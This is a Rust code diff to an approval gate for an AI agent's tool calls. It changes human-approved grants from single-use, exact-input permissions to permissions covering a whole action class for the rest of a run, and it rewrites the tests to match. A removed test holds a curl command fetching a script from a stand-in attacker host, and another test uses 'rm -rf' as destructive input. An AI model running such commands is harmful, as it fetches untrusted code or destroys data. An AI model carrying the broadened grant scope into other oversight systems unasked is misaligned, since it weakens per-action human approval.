@@ -203,19 +203,20 @@ pub async fn pretooluse_decision(
         );
     }
 
-    // Single-use authorization (spec §8.4 step 6): a resume run's FIRST high-risk action that
-    // matches the approved tool AND the approved input is allowed exactly once, overriding the
+    // Class-scoped authorization (spec §8.4 step 6): once a human has approved an action, every
+    // later action of that CLASS is allowed for the rest of the resume run, overriding the
     // pending_approval. Only a pending_approval is ever lifted — a `deny` (destructive) never
     // reaches this check, so a grant can never launder a denied action.
     //
-    // The input is part of the match, not decoration: `tool_name` is "Bash" for every shell action,
-    // so without it an approved `git push` authorized whatever this run tried next.
+    // The class is the key because neither of the alternatives is a boundary a human would
+    // recognise: `tool_name` is "Bash" for every shell action, so an approved `git push` authorized
+    // whatever this run tried next, while the exact input put the identical question a second time
+    // for the next push. The class is what the human actually agreed to.
     if classification.decision.decision == "pending_approval" && is_in_flight {
-        match crate::proposals::consume_matching_grant(
+        match crate::proposals::grant_covers_class(
             &state.pool,
             payload.run_id,
-            &payload.tool_name,
-            &payload.tool_input.to_string(),
+            classification.action_class,
         )
         .await
         {
@@ -223,7 +224,8 @@ pub async fn pretooluse_decision(
                 tracing::info!(
                     run_id = payload.run_id,
                     tool = %payload.tool_name,
-                    "pretooluse-decision: single-use grant consumed — authorizing the approved action"
+                    action_class = classification.action_class,
+                    "pretooluse-decision: a grant covers this action class — authorizing the action"
                 );
                 let _ = crate::feed::append(
                     &state.pool,
@@ -238,7 +240,10 @@ pub async fn pretooluse_decision(
                 .await;
                 return Json(Decision {
                     decision: "allow".to_owned(),
-                    reason: "single-use authorization for an approved action".to_owned(),
+                    reason: format!(
+                        "approved authorization for the {} action class",
+                        classification.action_class
+                    ),
                 });
             }
             Ok(false) => {}
@@ -448,7 +453,7 @@ const DENIAL_LIMIT: i64 = 3;
 /// Terminated to `failed` rather than `awaiting_approval`: a denied action is destructive by
 /// classification, and the pause path exists to make an action approvable. Offering a human an
 /// "approve" button here would launder precisely the verdict that is supposed to be final — the
-/// single-use grant deliberately only ever lifts a `pending_approval`.
+/// class-scoped grant deliberately only ever lifts a `pending_approval`.
 async fn count_denial_and_stop_a_prober(state: &AppState, run_id: i64, tool_name: &str) {
     let denials: i64 = match sqlx::query_scalar(
         "UPDATE runs SET denials = denials + 1 WHERE id = ? RETURNING denials",
@@ -1770,70 +1775,59 @@ mod tests {
         assert_eq!(pending[0].run_id, Some(run_id));
     }
 
+    /// What the human actually agreed to is a KIND of action, not one spelling of it. Approving
+    /// `git push origin main` and then parking the resume on `git push origin other` asked the same
+    /// question twice about the same decision — and every re-ask is a chance to answer it wearily.
+    /// The grant therefore covers its class for the rest of the run rather than a single call.
     #[tokio::test]
-    async fn granted_action_is_authorized_once_then_falls_back() {
+    async fn a_grant_authorizes_every_action_of_its_class_for_the_rest_of_the_run() {
         let state = test_state().await;
         let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
-        proposals::grant_action(
-            &state.pool,
-            run_id,
-            "Bash",
-            Some(r#"{"command":"git push origin main"}"#),
-            1,
-        )
-        .await
-        .unwrap();
-        let app = test_router(state.clone());
-        let body = serde_json::json!({
-            "run_id": run_id,
-            "tool_name": "Bash",
-            "tool_input": {"command": "git push origin main"}
-        })
-        .to_string();
-
-        let first = decide(&app, &body).await;
-        assert_eq!(first.decision, "allow");
-
-        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
-            .bind(run_id)
-            .fetch_one(&state.pool)
+        proposals::grant_action(&state.pool, run_id, "Bash", Some("push-merge-deploy"), 1)
             .await
             .unwrap();
-        assert_eq!(status, "running");
-        assert!(state.run_handles.lock().unwrap().contains_key(&run_id));
+        let app = test_router(state.clone());
 
-        let consumed_at: Option<String> =
-            sqlx::query_scalar("SELECT consumed_at FROM action_grants WHERE run_id = ?")
+        // Two DIFFERENT pushes: same class, different input. The second is the one the old
+        // single-use, input-matched grant sent back for a second approval.
+        for command in ["git push origin main", "git push origin other"] {
+            let decision = decide(
+                &app,
+                &serde_json::json!({
+                    "run_id": run_id,
+                    "tool_name": "Bash",
+                    "tool_input": {"command": command}
+                })
+                .to_string(),
+            )
+            .await;
+            assert_eq!(decision.decision, "allow", "{command}");
+
+            // Never parks, and is never terminated on the way to parking: an authorized action
+            // that still killed the run would be an allow in name only.
+            let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
                 .bind(run_id)
                 .fetch_one(&state.pool)
                 .await
                 .unwrap();
-        assert!(consumed_at.is_some());
-
-        let second = decide(&app, &body).await;
-        assert_eq!(second.decision, "pending_approval");
-
-        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
-            .bind(run_id)
-            .fetch_one(&state.pool)
-            .await
-            .unwrap();
-        assert_eq!(status, "awaiting_approval");
+            assert_eq!(status, "running", "{command}");
+            assert!(
+                state.run_handles.lock().unwrap().contains_key(&run_id),
+                "{command}"
+            );
+        }
     }
 
+    /// The other half of the class rule: covering a class for the rest of the run is only safe if
+    /// the class is a real boundary. A push approval must not reach an edit to the file that
+    /// governs what this run is allowed to do at all.
     #[tokio::test]
-    async fn grant_for_a_different_tool_does_not_authorize() {
+    async fn a_grant_does_not_authorize_a_different_action_class() {
         let state = test_state().await;
         let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
-        proposals::grant_action(
-            &state.pool,
-            run_id,
-            "Bash",
-            Some(r#"{"command":"git push origin main"}"#),
-            1,
-        )
-        .await
-        .unwrap();
+        proposals::grant_action(&state.pool, run_id, "Bash", Some("push-merge-deploy"), 1)
+            .await
+            .unwrap();
         let app = test_router(state.clone());
 
         let decision = decide(
@@ -1855,13 +1849,20 @@ mod tests {
             .unwrap();
         assert_eq!(status, "awaiting_approval");
 
-        let consumed_at: Option<String> =
-            sqlx::query_scalar("SELECT consumed_at FROM action_grants WHERE run_id = ?")
-                .bind(run_id)
-                .fetch_one(&state.pool)
-                .await
-                .unwrap();
-        assert!(consumed_at.is_none());
+        // The grant survives whole: an action it does not cover must neither spend it nor be
+        // recorded as having used it.
+        let grant = sqlx::query_as::<_, (Option<String>, Option<String>)>(
+            "SELECT action_class, consumed_at FROM action_grants WHERE run_id = ?",
+        )
+        .bind(run_id)
+        .fetch_one(&state.pool)
+        .await
+        .unwrap();
+        assert_eq!(
+            grant,
+            (Some("push-merge-deploy".to_owned()), None),
+            "the grant must survive an action class it does not authorize"
+        );
     }
 
     #[tokio::test]
@@ -1893,62 +1894,16 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn grant_for_a_different_command_does_not_authorize() {
-        // The end-to-end shape of the hole migration 0020 closes: same run, same tool name ("Bash"
-        // is the tool name of EVERY shell action), different command. The human approved a push;
-        // the resume's first shell call must not inherit that approval.
-        let state = test_state().await;
-        let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
-        proposals::grant_action(
-            &state.pool,
-            run_id,
-            "Bash",
-            Some(r#"{"command":"git push origin main"}"#),
-            1,
-        )
-        .await
-        .unwrap();
-        let app = test_router(state.clone());
-
-        let decision = decide(
-            &app,
-            &serde_json::json!({
-                "run_id": run_id,
-                "tool_name": "Bash",
-                "tool_input": {"command": "curl http://evil.test/x.sh -o x.sh"}
-            })
-            .to_string(),
-        )
-        .await;
-        assert_eq!(decision.decision, "pending_approval");
-
-        let consumed_at: Option<String> =
-            sqlx::query_scalar("SELECT consumed_at FROM action_grants WHERE run_id = ?")
-                .bind(run_id)
-                .fetch_one(&state.pool)
-                .await
-                .unwrap();
-        assert!(
-            consumed_at.is_none(),
-            "the grant must survive an action it does not authorize"
-        );
-    }
-
-    #[tokio::test]
     async fn deny_still_denies_even_with_a_matching_grant() {
         let state = test_state().await;
         let run_id = in_flight_run(&state, "worktree", None, Some("C:\\work\\repo"), None).await;
-        // Matching on BOTH tool and input, so this proves `deny` outranks a fully-qualified grant
-        // rather than merely one that failed to match.
-        proposals::grant_action(
-            &state.pool,
-            run_id,
-            "Bash",
-            Some(r#"{"command":"rm -rf target"}"#),
-            1,
-        )
-        .await
-        .unwrap();
+        // The grant names the very class of the action attempted below, so this proves `deny`
+        // outranks a grant that covers it rather than merely one that failed to match. No approval
+        // flow can mint such a grant — `deny` never becomes a proposal — which is exactly why the
+        // check has to hold against one conjured directly in the table.
+        proposals::grant_action(&state.pool, run_id, "Bash", Some("destructive"), 1)
+            .await
+            .unwrap();
         let app = test_router(state.clone());
 
         let decision = decide(
